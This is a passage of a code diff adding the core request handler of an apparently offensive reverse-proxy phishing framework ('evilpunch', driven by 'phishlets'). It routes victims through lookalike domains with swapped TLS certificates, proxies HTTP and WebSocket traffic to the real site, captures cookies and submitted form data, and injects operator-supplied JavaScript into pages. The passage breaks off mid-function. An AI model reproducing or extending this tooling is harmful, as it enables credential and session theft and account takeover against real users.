+                        # Add this to the reverse routing table later
+                        debug_log(f"    Will add reverse mapping: {subdomain_target} -> {proxy_host}", "DEBUG")
+                        
+    except Exception as e:
+        debug_log(f"Failed to build routing from phishlets: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+        
+    debug_log(f"Final routing mapping: {mapping}", "DEBUG")
+    debug_log("=== END BUILDING ROUTING ===", "DEBUG")
+    return mapping
+
+
+def _get_active_proxy_hosts_from_db() -> List[str]:
+    hosts: List[str] = []
+    debug_log("Getting active proxy hosts from database...", "DEBUG")
+    try:
+        from .models import ProxyDomain  # type: ignore
+        for d in ProxyDomain.objects.filter(is_active=True):
+            hostname = _normalize_hostname(d.hostname)
+            hosts.append(hostname)
+            debug_log(f"  Found active domain: {hostname}", "DEBUG")
+    except Exception as e:
+        debug_log(f"Error getting proxy hosts from DB: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+    
+    debug_log(f"Total active proxy hosts from DB: {len(hosts)}", "INFO")
+    return hosts
+
+
+def _get_proxy_hosts_from_config() -> List[str]:
+    hosts: List[str] = []
+    debug_log("Getting proxy hosts from configuration...", "DEBUG")
+    try:
+        from .config import get_config  # type: ignore
+        cfg = get_config()
+        for h in cfg.get("proxy_domains", []) or []:
+            if isinstance(h, str) and h.strip():
+                hostname = _normalize_hostname(h)
+                hosts.append(hostname)
+                debug_log(f"  Found config domain: {hostname}", "DEBUG")
+    except Exception as e:
+        debug_log(f"Error getting proxy hosts from config: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+    
+    debug_log(f"Total proxy hosts from config: {len(hosts)}", "INFO")
+    return hosts
+
+
+def _load_sni_contexts() -> Tuple[Optional[ssl.SSLContext], Dict[str, ssl.SSLContext]]:
+    """
+    Create a base SSLContext and domain-specific contexts for SNI using
+    certificates stored in the database. Falls back to default cert files if no DB certs.
+    Returns (base_context_or_none, per_host_contexts).
+    """
+    per_host: Dict[str, ssl.SSLContext] = {}
+    base_context: Optional[ssl.SSLContext] = None
+    
+    debug_log("=== LOADING SSL SNI CONTEXTS ===", "DEBUG")
+
+    try:
+        from .models import ProxyDomain  # type: ignore
+        # Gather active domains that have certificates
+        domains = (
+            ProxyDomain.objects.filter(is_active=True)
+            .select_related("certificate")
+        )
+        
+        debug_log(f"Found {domains.count()} active proxy domains", "INFO")
+
+        first_loaded: Optional[Tuple[str, Path, Path]] = None
+        for d in domains:
+            debug_log(f"Processing domain: {d.hostname}", "DEBUG")
+            cert = getattr(d, "certificate", None)
+            if not cert:
+                debug_log(f"  No certificate found", "WARN")
+                continue
+                
+            cert_pem = getattr(cert, "cert_pem", "") or ""
+            key_pem = getattr(cert, "key_pem", "") or ""
+            
+            debug_log(f"  Cert length: {len(cert_pem)} chars", "DEBUG")
+            debug_log(f"  Key length: {len(key_pem)} chars", "DEBUG")
+            
+            if not cert_pem.strip() or not key_pem.strip():
+                debug_log(f"  Empty cert or key, skipping", "WARN")
+                continue
+                
+            try:
+                cert_path, key_path = _write_cert_files(d.hostname, cert_pem, key_pem)
+                debug_log(f"  Wrote cert files: {cert_path}, {key_path}", "DEBUG")
+                
+                ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                ctx.load_cert_chain(str(cert_path), str(key_path))
+                normalized_host = _normalize_hostname(d.hostname)
+                per_host[normalized_host] = ctx
+                
+                debug_log(f"  ✓ Successfully loaded SSL context for {normalized_host}", "INFO")
+                
+                if first_loaded is None:
+                    first_loaded = (d.hostname, cert_path, key_path)
+                    debug_log(f"  Set as first loaded (base context)", "DEBUG")
+                    
+            except Exception as e:
+                debug_log(f"  Failed to load certificate for {d.hostname}: {e}", "ERROR")
+                debug_log(f"  Traceback: {traceback.format_exc()}", "DEBUG")
+
+        # Build base context
+        if first_loaded is not None:
+            debug_log(f"Creating base SSL context from {first_loaded[0]}", "INFO")
+            base_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            try:
+                base_context.load_cert_chain(str(first_loaded[1]), str(first_loaded[2]))
+                debug_log(f"✓ Base SSL context created successfully", "INFO")
+            except Exception as e:
+                debug_log(f"Failed to set base cert from DB: {e}", "ERROR")
+                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+                base_context = None
+
+    except Exception as e:
+        debug_log(f"SSL DB load error: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+    # Fallback to default files if no DB certs worked
+    if base_context is None:
+        debug_log("No DB certs worked, checking default cert files...", "INFO")
+        if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
+            debug_log(f"Default cert files found: {CERT_FILE}, {KEY_FILE}", "INFO")
+            try:
+                base_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                base_context.load_cert_chain(CERT_FILE, KEY_FILE)
+                debug_log(f"✓ Loaded default SSL context from files", "INFO")
+            except Exception as e:
+                debug_log(f"SSL default cert load failed: {e}", "ERROR")
+                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+                base_context = None
+        else:
+            debug_log("No default cert files found", "WARN")
+
+    debug_log(f"Final SSL contexts - Base: {'✓' if base_context else '✗'}, Per-host: {len(per_host)}", "INFO")
+    debug_log("=== END LOADING SSL ===", "DEBUG")
+    return base_context, per_host
+
+
+def _refresh_routing_and_ssl() -> Optional[ssl.SSLContext]:
+    """
+    Refresh global routing table, allowed proxy hosts list, and SNI contexts.
+    Returns the base SSLContext to use (may be None, in which case HTTP is used).
+    """
+    global _routing_table, _active_proxy_hosts, _sni_contexts
+
+    debug_log("=== REFRESHING ROUTING AND SSL ===", "DEBUG")
+    
+    # Build routing from active phishlets
+    debug_log("Building routing from active phishlets...", "INFO")
+    routing = _build_routing_from_active_phishlets()
+    
+    # Get active proxy hosts
+    debug_log("Getting active proxy hosts...", "INFO")
+    active_hosts = set(_get_active_proxy_hosts_from_db() or _get_proxy_hosts_from_config())
+    _active_proxy_hosts = sorted(active_hosts)
+    debug_log(f"Active proxy hosts: {_active_proxy_hosts}", "INFO")
+
+    # If active_hosts is non-empty, filter routing to those; allow subdomains of active hosts
+    if active_hosts:
+        debug_log("Filtering routing table based on active hosts...", "DEBUG")
+        def _is_allowed(proxy_host: str) -> bool:
+            ph = _normalize_hostname(proxy_host)
+            for ah in active_hosts:
+                ahn = _normalize_hostname(ah)
+                if ph == ahn or ph.endswith("." + ahn):
+                    return True
+            return False
+
+        original_count = len(routing)
+        _routing_table = {h: t for h, t in routing.items() if _is_allowed(h)}
+        filtered_count = len(_routing_table)
+        debug_log(f"Filtered routing: {original_count} -> {filtered_count} entries", "INFO")
+    else:
+        debug_log("No active hosts specified, using all routing entries", "WARN")
+        _routing_table = routing
+
+    # Build reverse map: target_host -> proxy_host, prefer shorter proxy host (root over subdomain) if multiple
+    debug_log("Building reverse routing table...", "DEBUG")
+    reverse_map: Dict[str, str] = {}
+    for proxy_host, target_host in _routing_table.items():
+        current = reverse_map.get(target_host)
+        if current is None or len(proxy_host) < len(current):
+            reverse_map[target_host] = proxy_host
+            debug_log(f"  {target_host} -> {proxy_host}", "DEBUG")
+    
+    global _reverse_routing_table
+    _reverse_routing_table = reverse_map
+    
+    # Debug logging for routing tables
+    debug_log(f"Final routing table ({len(_routing_table)} entries):", "INFO")
+    for ph, th in _routing_table.items():
+        debug_log(f"  {ph} -> {th}", "DEBUG")
+    
+    debug_log(f"Reverse routing table ({len(_reverse_routing_table)} entries):", "INFO")
+    for th, ph in _reverse_routing_table.items():
+        debug_log(f"  {th} -> {ph}", "DEBUG")
+
+    # Load SSL contexts
+    debug_log("Loading SSL contexts...", "INFO")
+    base_ctx, per_host = _load_sni_contexts()
+    _sni_contexts = per_host
+
+    if base_ctx is not None and _sni_contexts:
+        debug_log("Setting up SNI callback...", "INFO")
+        # Install SNI callback to swap certs based on hostname
+        def _sni_cb(ssl_sock: ssl.SSLSocket, server_name: str, initial_ctx: ssl.SSLContext):
+            try:
+                host = _normalize_hostname(server_name or "")
+                debug_log(f"SNI callback for host: {host}", "DEBUG")
+                ctx = _sni_contexts.get(host)
+                if ctx is not None:
+                    ssl_sock.context = ctx
+                    debug_log(f"✓ Switched SSL context for {host}", "DEBUG")
+                else:
+                    debug_log(f"No SSL context found for {host}, using base", "DEBUG")
+            except Exception as e:
+                debug_log(f"SNI callback error: {e}", "ERROR")
+
+        try:
+            base_ctx.set_servername_callback(_sni_cb)
+            debug_log("✓ SNI callback installed successfully", "INFO")
+        except Exception as e:
+            debug_log(f"Failed to set SNI callback: {e}", "ERROR")
+            debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+    # Log routing summary
+    if _routing_table:
+        debug_log(f"Routing summary: {len(_routing_table)} entries", "INFO")
+        for ph, th in list(_routing_table.items())[:5]:
+            debug_log(f"  {ph} -> {th}", "INFO")
+        if len(_routing_table) > 5:
+            debug_log(f"  ... {len(_routing_table) - 5} more", "INFO")
+    else:
+        debug_log("No routing entries from active phishlets", "WARN")
+
+    debug_log("=== END REFRESHING ROUTING AND SSL ===", "DEBUG")
+    return base_ctx
+
+
+async def websocket_handler(request, target_ws_url, matching_phishlet=None):
+    debug_log("=== WEBSOCKET HANDLER ===", "INFO")
+    debug_log(f"Target WebSocket URL: {target_ws_url}", "DEBUG")
+    
+    client_ws = web.WebSocketResponse()
+    await client_ws.prepare(request)
+    debug_log(f"WebSocket upgrade from {request.remote} -> {target_ws_url}", "INFO")
+    
+    # Replace proxy host with target host in outgoing headers
+    client_host = _normalize_hostname(request.headers.get("Host", PROXY_HOST))
+    upstream_host = urlparse(target_ws_url).hostname or ""
+    debug_log(f"Client host: {client_host}, Upstream host: {upstream_host}", "DEBUG")
+    
+    # For WebSocket, we don't have phishlet data, so use simple replacement
+    request.headers = patch_headers_out(request.headers, client_host, upstream_host)
+    debug_log(f"Patched headers: {dict(request.headers)}", "DEBUG")
+
+    try:
+        debug_log("Creating client session for WebSocket", "DEBUG")
+        
+        # Get proxy configuration from phishlet if available
+        proxy_config = matching_phishlet.get('proxy') if matching_phishlet else None
+        if proxy_config:
+            debug_log(f"WebSocket using proxy configuration: {proxy_config['type']}://{proxy_config['host']}:{proxy_config['port']}", "INFO")
+        else:
+            debug_log("WebSocket using direct connection (no proxy configured)", "DEBUG")
+        
+        async with create_proxy_session(proxy_config) as session:
+            debug_log("Connecting to upstream WebSocket", "DEBUG")
+            # Prepare WebSocket connection parameters
+            ws_kwargs = {
+                'url': target_ws_url,
+                'headers': request.headers,
+                'ssl': False,
+            }
+            
+            # Add proxy configuration if available
+            if proxy_config and proxy_config['type'] in ['http', 'https']:
+                # For aiohttp, we need to use the proxy URL format
+                proxy_url = proxy_config['url']
+                ws_kwargs['proxy'] = proxy_url
+                debug_log(f"Adding proxy to WebSocket connection: {proxy_url}", "DEBUG")
+                debug_log(f"Full WebSocket kwargs: {ws_kwargs}", "DEBUG")
+                
+                # Also add proxy_auth if username/password are provided
+                if proxy_config.get('username') and proxy_config.get('password'):
+                    from aiohttp import BasicAuth
+                    ws_kwargs['proxy_auth'] = BasicAuth(
+                        proxy_config['username'], 
+                        proxy_config['password']
+                    )
+                    debug_log(f"Added proxy authentication for user: {proxy_config['username']}", "DEBUG")
+            else:
+                debug_log("No proxy configuration available for WebSocket connection", "DEBUG")
+            
+            async with session.ws_connect(**ws_kwargs) as server_ws:
+                if proxy_config:
+                    debug_log(f"✅ WebSocket connected through proxy: {proxy_config['url']}", "INFO")
+                else:
+                    debug_log("✅ WebSocket connected directly (no proxy)", "INFO")
+                debug_log("✓ Upstream WebSocket connected", "INFO")
+
+                async def client_to_server():
+                    debug_log("Starting client->server WebSocket forwarding", "DEBUG")
+                    msg_count = 0
+                    try:
+                        async for msg in client_ws:
+                            msg_count += 1
+                            if msg_count % 100 == 0:  # Log every 100th message
+                                debug_log(f"Client->Server: processed {msg_count} messages", "DEBUG")
+                                
+                            if msg.type == WSMsgType.TEXT:
+                                await server_ws.send_str(msg.data)
+                            elif msg.type == WSMsgType.BINARY:
+                                await server_ws.send_bytes(msg.data)
+                            elif msg.type == WSMsgType.CLOSE:
+                                debug_log("Client sent CLOSE message", "DEBUG")
+                                await server_ws.close()
+                                break
+                    except Exception as e:
+                        debug_log(f"Client->Server error: {e}", "ERROR")
+                        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+                    finally:
+                        debug_log(f"Client->Server forwarding ended after {msg_count} messages", "INFO")
+
+                async def server_to_client():
+                    debug_log("Starting server->client WebSocket forwarding", "DEBUG")
+                    msg_count = 0
+                    try:
+                        async for msg in server_ws:
+                            msg_count += 1
+                            if msg_count % 100 == 0:  # Log every 100th message
+                                debug_log(f"Server->Client: processed {msg_count} messages", "DEBUG")
+                                
+                            if msg.type == WSMsgType.TEXT:
+                                await client_ws.send_str(msg.data)
+                            elif msg.type == WSMsgType.BINARY:
+                                await client_ws.send_bytes(msg.data)
+                            elif msg.type == WSMsgType.CLOSE:
+                                debug_log("Server sent CLOSE message", "DEBUG")
+                                await client_ws.close()
+                                break
+                    except Exception as e:
+                        debug_log(f"Server->Client error: {e}", "ERROR")
+                        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+                    finally:
+                        debug_log(f"Server->Client forwarding ended after {msg_count} messages", "INFO")
+
+                debug_log("Starting bidirectional WebSocket forwarding", "INFO")
+                await asyncio.gather(client_to_server(), server_to_client())
+                debug_log("WebSocket forwarding complete", "INFO")
+
+    except Exception as e:
+        debug_log(f"WebSocket proxy error: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+        if not client_ws.closed:
+            await client_ws.close()
+
+    debug_log("=== WEBSOCKET HANDLER END ===", "DEBUG")
+    return client_ws
+
+
+async def temp_js_handler(request):
+    """
+    Handler for temporary JavaScript endpoints.
+    Serves JavaScript code from the _temp_js_endpoints dictionary.
+    """
+    endpoint_id = request.match_info.get('endpoint_id')
+    if not endpoint_id:
+        return web.Response(text="Invalid endpoint", status=400)
+    
+    # Debug: Show comprehensive request information
+    debug_log(f"🔍 JS endpoint request: {endpoint_id}", "INFO")
+    debug_log(f"🔍 Request method: {request.method}", "DEBUG")
+    debug_log(f"🔍 Request URL: {request.url}", "DEBUG")
+    debug_log(f"🔍 Request path: {request.path}", "DEBUG")
+    debug_log(f"🔍 Request headers: {dict(request.headers)}", "DEBUG")
+    debug_log(f"🔍 Client IP: {get_client_ip(request)}", "DEBUG")
+    debug_log(f"🔍 Available endpoints: {list(_temp_js_endpoints.keys())}", "DEBUG")
+    debug_log(f"🔍 Total endpoints stored: {len(_temp_js_endpoints)}", "DEBUG")
+    
+    # Add a test endpoint for debugging
+    if endpoint_id == "test":
+        debug_log(f"🧪 Test endpoint requested", "INFO")
+        return web.Response(
+            text="console.log('Test endpoint working!'); alert('Test endpoint accessible!');",
+            headers={'Content-Type': 'application/javascript; charset=utf-8'}
+        )
+    
+    # Handle OPTIONS request (CORS preflight)
+    if request.method == 'OPTIONS':
+        debug_log(f"🔄 CORS preflight request for endpoint: {endpoint_id}", "DEBUG")
+        headers = {
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type',
+            'Access-Control-Max-Age': '86400'  # 24 hours
+        }
+        return web.Response(headers=headers)
+    
+    js_code = _temp_js_endpoints.get(endpoint_id)
+    if not js_code:
+        debug_log(f"❌ JavaScript not found for endpoint: {endpoint_id}", "WARN")
+        debug_log(f"❌ All available endpoints: {list(_temp_js_endpoints.keys())}", "DEBUG")
+        return web.Response(text="JavaScript not found", status=404)
+    
+    debug_log(f"✅ Serving JavaScript from endpoint: {endpoint_id}", "INFO")
+    debug_log(f"✅ JavaScript code length: {len(js_code)} characters", "DEBUG")
+    debug_log(f"✅ JavaScript code preview: {js_code[:100]}{'...' if len(js_code) > 100 else ''}", "DEBUG")
+    
+    # Set appropriate headers for JavaScript
+    headers = {
+        'Content-Type': 'application/javascript; charset=utf-8',
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0',
+        'Access-Control-Allow-Origin': '*',  # Allow cross-origin requests
+        'Access-Control-Allow-Methods': 'GET, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type'
+    }
+    
+    debug_log(f"✅ Response headers: {headers}", "DEBUG")
+    debug_log(f"✅ Response status: 200 OK", "DEBUG")
+    debug_log(f"✅ Response body length: {len(js_code)}", "DEBUG")
+    
+    return web.Response(text=js_code, headers=headers)
+
+
+async def proxy_handler(request):
+    debug_log("=== PROXY REQUEST HANDLER ===", "DEBUG")
+    debug_log(f"Request method: {request.method}", "DEBUG")
+    # Limit URL logging to first 20 characters to reduce noise
+    url_preview = str(request.url)[:20] + "..." if len(str(request.url)) > 20 else str(request.url)
+    debug_log(f"Request URL: {url_preview}", "DEBUG")
+    # debug_log(f"Request headers: {dict(request.headers)}", "DEBUG")  # Commented out to reduce noise
+    
+    # Debug: Check if this is a static file request
+    url_path = str(request.rel_url)
+    static_extensions = ['.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf', '.eot', '.webp', '.mp4', '.mp3', '.pdf', '.zip', '.rar', '.tar', '.gz']
+    is_static_file = any(url_path.lower().endswith(ext) for ext in static_extensions)
+    
+    if is_static_file:
+        debug_log(f"🔍 STATIC FILE DETECTED: {url_path}", "INFO")
+        debug_log(f"   File type: {url_path.split('.')[-1].upper() if '.' in url_path else 'Unknown'}", "INFO")
+        debug_log(f"   Request method: {request.method}", "INFO")
+        # debug_log(f"   User-Agent: {request.headers.get('User-Agent', 'N/A')}", "DEBUG")  # Commented out to reduce noise
+        # debug_log(f"   Accept: {request.headers.get('Accept', 'N/A')}", "DEBUG")  # Commented out to reduce noise
+        # debug_log(f"   Referer: {request.headers.get('Referer', 'N/A')}", "DEBUG")  # Commented out to reduce noise
+    else:
+        debug_log(f"📄 HTML/DYNAMIC CONTENT: {url_path}", "DEBUG")
+    
+    incoming_host = _normalize_hostname(request.headers.get("Host", PROXY_HOST))
+    debug_log(f"Incoming host: '{incoming_host}'", "INFO")
+    
+    # Debug: Show which phishlet this request is using
+    matching_phishlet = None  # Ensure defined even if an error occurs before assignment
+    try:
+        # Use thread executor to handle Django model operations
+        import asyncio
+        
+        async def get_phishlet_info():
+            # Run Django operations in a thread to avoid async context issues
+            def _get_phishlet_data():
+                from .models import Phishlet  # type: ignore
+                active_phishlets = Phishlet.objects.filter(is_active=True)
+                
+                for phishlet in active_phishlets:
+                    data = phishlet.data if isinstance(phishlet.data, dict) else {}
+                    proxy_domain = str(data.get("proxy_domain", "")).strip().lower()
+                    hosts_list = data.get("hosts_to_proxy") or []
+                    
+                    if not proxy_domain or not isinstance(hosts_list, list):
+                        continue
+                        
+                    for entry in hosts_list:
+                        if not isinstance(entry, dict):
+                            continue
+                            
+                        proxy_sub_raw = entry.get("proxy_subdomain")
+                        if not (isinstance(proxy_sub_raw, str) and proxy_sub_raw.strip()):
+                            proxy_sub_raw = entry.get("original_subdomain") or entry.get("orignal_subdomain") or ""
+                        proxy_sub = str(proxy_sub_raw or "").strip().lower()
+                        
+                        proxy_host = proxy_domain if not proxy_sub else f"{proxy_sub}.{proxy_domain}"
+                        # Check if incoming_host matches the proxy_host (including subdomain)
+                        if incoming_host == proxy_host or incoming_host.endswith('.' + proxy_domain):
+                            # Get proxy configuration if available
+                            proxy_config = None
+                            if hasattr(phishlet, 'proxy') and phishlet.proxy:
+                                # For aiohttp, the proxy URL should not include authentication
+                                # Authentication is handled separately via proxy_auth
+                                proxy_url = f"{phishlet.proxy.proxy_type}://{phishlet.proxy.host}:{phishlet.proxy.port}"
+                                proxy_config = {
+                                    'type': phishlet.proxy.proxy_type,
+                                    'host': phishlet.proxy.host,
+                                    'port': phishlet.proxy.port,
+                                    'username': phishlet.proxy.username,
+                                    'password': phishlet.proxy.password,
+                                    'url': proxy_url
+                                }
+                                debug_log(f"Created proxy config: {proxy_url} (auth: {phishlet.proxy.username}:***)", "DEBUG")
+                            
+                            return {
+                                'id': phishlet.id,
+                                'name': getattr(phishlet, 'name', 'N/A'),
+                                'proxy_domain': proxy_domain,
+                                'target_url': data.get('target_url', 'N/A'),
+                                'proxy_auth': getattr(phishlet, 'proxy_auth', ''),  # Include proxy_auth from model
+                                'proxy': proxy_config,  # Include proxy configuration
+                                'data': data # Include the full data for replacement logic
+                            }
+                
+                return None
+            
+            # Run in thread executor to avoid Django async issues
+            loop = asyncio.get_running_loop()
+            return await loop.run_in_executor(None, _get_phishlet_data)
+        
+        # Get phishlet info asynchronously
+        matching_phishlet = await get_phishlet_info()
+        
+        if matching_phishlet:
+            debug_log(f"=== PHISHLET INFO ===", "INFO")
+            debug_log(f"Phishlet ID: {matching_phishlet['id']}", "INFO")
+            debug_log(f"Phishlet name: {matching_phishlet['name']}", "INFO")
+            debug_log(f"Proxy domain: {matching_phishlet['proxy_domain']}", "INFO")
+            debug_log(f"Target URL: {matching_phishlet['target_url']}", "INFO")
+            
+            # Log proxy configuration if available
+            if matching_phishlet.get('proxy'):
+                proxy_info = matching_phishlet['proxy']
+                debug_log(f"Proxy configuration: {proxy_info['type']}://{proxy_info['host']}:{proxy_info['port']}", "INFO")
+                if proxy_info.get('username'):
+                    debug_log(f"Proxy auth: {proxy_info['username']}:***", "INFO")
+            else:
+                debug_log("No proxy configuration found", "INFO")
+            
+            # debug_log(f"Hosts to proxy: {matching_phishlet['hosts_to_proxy']}", "DEBUG")  # Commented out to reduce noise
+            debug_log(f"=== END PHISHLET INFO ===", "INFO")
+            
+            # === SESSION MANAGEMENT ===
+            try:
+                # Get or create session for this visitor on this phishlet+domain
+                session_cookie = await get_or_create_session(
+                    request, 
+                    matching_phishlet['id'], 
+                    matching_phishlet['proxy_domain']
+                )
+                
+                if session_cookie:
+                    debug_log(f"Session cookie: {session_cookie[:8]}...", "DEBUG")
+                    
+                    # Check if this is a new session (user just authenticated via proxy_auth path)
+                    url_path = str(request.rel_url)
+                    proxy_auth_path = matching_phishlet.get('proxy_auth', '')
+                    
+                    # If we're on the proxy_auth path and have a session, this is likely a new session
+                    # that should redirect to the landing_url
+                    if url_path == proxy_auth_path:
+                        landing_url = matching_phishlet.get('data', {}).get('landing_url', '/')
+                        debug_log(f"New session detected on proxy_auth path, redirecting to landing_url: {landing_url}", "INFO")
+                        
+                        # Handle both relative and absolute URLs
+                        if landing_url.startswith('http'):
+                            # Absolute URL - extract the path part
+                            from urllib.parse import urlparse
+                            parsed_url = urlparse(landing_url)
+                            redirect_path = parsed_url.path
+                            if parsed_url.query:
+                                redirect_path += '?' + parsed_url.query
+                            debug_log(f"Converted absolute URL '{landing_url}' to path '{redirect_path}'", "DEBUG")
+                        else:
+                            # Relative URL - use as is
+                            redirect_path = landing_url
+                        
+                        # Create 302 redirect response with session cookie
+                        response = web.HTTPFound(redirect_path)
+                        
+                        # Set cookie domain to base domain for cross-subdomain access
+                        # Extract base domain from proxy_domain (e.g., 'xx.in' from 'xxtt.xx.in')
+                        base_domain = matching_phishlet['proxy_domain']
+                        if '.' in base_domain:
+                            # For subdomains, use the base domain
+                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
+                        
+                        response.set_cookie(
+                            f'evilpunch_session_{matching_phishlet["id"]}', 
+                            session_cookie,
+                            max_age=3600*24*30,  # 30 days
+                            httponly=True,
+                            secure=False,  # Set to True if using HTTPS
+                            samesite='Lax',
+                            domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
+                        )
+                        return response
+                    
+                    # Capture cookies from the request
+                    await capture_cookies(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
+                    
+                    # Capture form data if this is a POST request
+                    await capture_form_data(request, session_cookie, matching_phishlet['id'], matching_phishlet['proxy_domain'])
+                    
+                    # Store session info for later use in response
+                    request['session_cookie'] = session_cookie
+                    request['phishlet_id'] = matching_phishlet['id']
+                    request['proxy_domain'] = matching_phishlet['proxy_domain']
+                else:
+                    debug_log("No session cookie found, checking proxy_auth path", "DEBUG")
+                    # Check if this is a proxy_auth path access
+                    url_path = str(request.rel_url)
+                    proxy_auth_path = matching_phishlet.get('proxy_auth', '')
+                    
+                    if not proxy_auth_path:
+                        debug_log("No proxy_auth path configured, denying access", "WARN")
+                        return web.Response(text="Access Denied - No proxy_auth path configured", status=403)
+                    
+                    if url_path != proxy_auth_path:
+                        debug_log(f"Access denied: {url_path} != {proxy_auth_path} (proxy_auth path)", "WARN")
+                        return web.Response(text="Access Denied - Authentication required", status=403)
+                    
+                    debug_log(f"Accessing proxy_auth path: {url_path}, allowing access", "INFO")
+                    
+            except Exception as e:
+                debug_log(f"Error in session management: {e}", "ERROR")
+                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+                return web.Response(text="Internal Server Error", status=500)
+            # === END SESSION MANAGEMENT ===
+            
+            # === JAVASCRIPT INJECTION ===
+            if matching_phishlet and matching_phishlet.get('data'):
+                debug_log("=== JAVASCRIPT INJECTION SECTION ===", "INFO")
+                phishlet_data = matching_phishlet['data']
+                
+                # Check if JavaScript injection should happen for this request
+                js_matches = _check_js_injection_match(phishlet_data, incoming_host, url_path)
+                debug_log(f"🎯 JS injection check: {len(js_matches)} matches found", "INFO")
+                
+                if js_matches:
+                    debug_log(f"✅ JavaScript injection triggered for {len(js_matches)} rules", "INFO")
+                    script_endpoints = []
+                    
+                    for match in js_matches:
+                        debug_log(f"🎯 Processing JS injection match: {match}", "DEBUG")
+                        js_code = match.get('js_code', '')
+                        if js_code:
+                            endpoint_id = _create_temp_js_endpoint(js_code)
+                            script_endpoints.append(endpoint_id)
+                            debug_log(f"✅ Created JS endpoint {endpoint_id} for injection", "INFO")
+                            debug_log(f"✅ JS code preview: {js_code[:100]}{'...' if len(js_code) > 100 else ''}", "DEBUG")
+                        else:
+                            debug_log(f"⚠️  No JS code found in match: {match}", "WARN")
+                    
+                    if script_endpoints:
+                        request['js_script_endpoints'] = script_endpoints
+                        debug_log(f"✅ Stored {len(script_endpoints)} script endpoints for injection: {script_endpoints}", "INFO")
+                        debug_log(f"✅ Current _temp_js_endpoints: {list(_temp_js_endpoints.keys())}", "DEBUG")
+                    else:
+                        debug_log("⚠️  No script endpoints created", "WARN")
+                else:
+                    debug_log("⏭️  No JavaScript injection matches found", "DEBUG")
+            else:
+                debug_log("⏭️  JavaScript injection skipped - no matching phishlet or data", "DEBUG")
+        else:
+            debug_log(f"No matching phishlet found for host: {incoming_host}", "WARN")
+            # Get all available proxy hosts for debugging
+            async def get_all_proxy_hosts():
+                def _get_all_hosts():
+                    from .models import Phishlet  # type: ignore
+                    active_phishlets = Phishlet.objects.filter(is_active=True)
+                    all_hosts = []
+                    
+                    for phishlet in active_phishlets:
+                        data = phishlet.data if isinstance(phishlet.data, dict) else {}
+                        proxy_domain = str(data.get("proxy_domain", "")).strip().lower()
+                        hosts_list = data.get("hosts_to_proxy") or []
+                        if proxy_domain and isinstance(hosts_list, list):
+                            for entry in hosts_list:
+                                if isinstance(entry, dict):
+                                    proxy_sub = entry.get("proxy_subdomain") or entry.get("original_subdomain") or entry.get("orignal_subdomain") or ""
+                                    proxy_host = proxy_domain if not proxy_sub else f"{proxy_sub}.{proxy_domain}"
+                                    all_hosts.append((proxy_host, phishlet.id))
+                    return all_hosts
+                
+                loop = asyncio.get_running_loop()
+                return await loop.run_in_executor(None, _get_all_hosts)
+            
+            all_hosts = await get_all_proxy_hosts()
+            debug_log(f"Available proxy hosts in phishlets:", "DEBUG")
+            for proxy_host, phishlet_id in all_hosts:
+                debug_log(f"  - {proxy_host} (Phishlet ID: {phishlet_id})", "DEBUG")
+            
+    except Exception as e:
+        debug_log(f"Error getting phishlet info: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+    
+    # Resolve target host for this incoming host; if none, return 404
+    target_host = _get_target_host_from_routing(incoming_host)
+    debug_log(f"Target host resolved: '{target_host}'", "INFO")
+    
+    if not target_host:
+        debug_log(f"No routing found for '{incoming_host}', returning 404", "WARN")
+        debug_log(f"Available routes: {list(_routing_table.keys())}", "DEBUG")
+        return web.Response(text="Not Found", status=404)
+
+    # Handle WebSocket upgrade
+    if request.headers.get("Upgrade") == "websocket" and request.headers.get("Connection") == "Upgrade":
+        debug_log("WebSocket upgrade detected", "INFO")
+        target_ws_url = f"wss://{target_host}{request.rel_url}"
+        debug_log(f"WebSocket target URL: {target_ws_url}", "DEBUG")
+        return await websocket_handler(request, target_ws_url, matching_phishlet)
+
+    # Prepare headers and target URL for HTTP request
+    debug_log("Preparing HTTP proxy request...", "DEBUG")
+    # Pass phishlet data for proper reverse filter header replacement
+    phishlet_data_for_headers = matching_phishlet.get('data') if matching_phishlet else None
+    forward_headers = patch_headers_out(request.headers, incoming_host, target_host, phishlet_data_for_headers)
+    target_url = f"https://{target_host}{request.rel_url}"
+    debug_log(f"Target URL: {target_url}", "DEBUG")
+    debug_log(f"Forward headers: {dict(forward_headers)}", "DEBUG")
+
+    try:
+        debug_log("Initiating upstream request...", "DEBUG")
+        
+        # Get proxy configuration from phishlet if available
+        proxy_config = matching_phishlet.get('proxy') if matching_phishlet else None
+        if proxy_config:
+            debug_log(f"Using proxy configuration: {proxy_config['type']}://{proxy_config['host']}:{proxy_config['port']}", "INFO")
+        
+        async with create_proxy_session(proxy_config) as session:
+            # Use stored request body if available (from credential capture), otherwise read it
+            request_data = request.get('_body') if request.get('_body') else await request.read()
+            
+            # Apply reverse filter to request body if enabled
+            if matching_phishlet and matching_phishlet.get('data'):
+                from .helpers import apply_reverse_filter_to_request_body
